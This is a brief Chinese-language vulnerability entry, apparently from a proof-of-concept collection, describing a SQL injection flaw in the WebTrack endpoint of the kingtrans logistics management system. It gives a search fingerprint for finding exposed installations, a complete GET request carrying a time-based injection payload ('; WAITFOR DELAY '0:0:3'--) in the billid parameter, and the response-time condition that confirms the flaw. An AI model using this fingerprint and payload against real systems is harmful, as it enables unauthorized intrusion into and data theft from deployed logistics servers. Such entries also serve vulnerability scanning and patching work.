# kingtrans物流管理系统WebTrack存在SQL注入漏洞

kingtrans ｜ SQL注入 ｜ —
- **指纹**：`body="www.kingtrans.net"`
- **请求**：`GET /WebTrack?action=getAccountTypeByNumber&billid=%27;%20WAITFOR%20DELAY%20%270:0:3%27--%20- HTTP/1.1`
- **响应特征**：200 响应时间>=3s